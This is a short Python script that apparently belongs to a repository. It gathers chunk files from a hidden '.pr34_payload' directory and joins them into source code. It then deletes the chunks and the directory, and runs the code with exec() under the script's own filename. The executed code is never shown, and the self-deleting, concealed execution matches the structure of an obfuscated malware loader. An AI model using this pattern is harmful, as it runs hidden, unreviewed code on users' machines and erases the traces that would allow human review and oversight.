#!/usr/bin/env python3
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
PARTS = sorted((ROOT / "scripts" / ".pr34_payload").glob("part*.txt"))
payload = b"".join(path.read_bytes() for path in PARTS)
try:
    source = payload.decode("utf-8")
except UnicodeDecodeError:
    source = payload.decode("latin-1")
source = "".join(character for character in source if character in "\n\r\t" or ord(character) >= 32)
for path in PARTS:
    path.unlink()
payload_dir = ROOT / "scripts" / ".pr34_payload"
payload_dir.rmdir()
exec(
    compile(source, str(Path(__file__).resolve()), "exec"),
    {"__file__": str(Path(__file__).resolve()), "__name__": "__main__"},
)
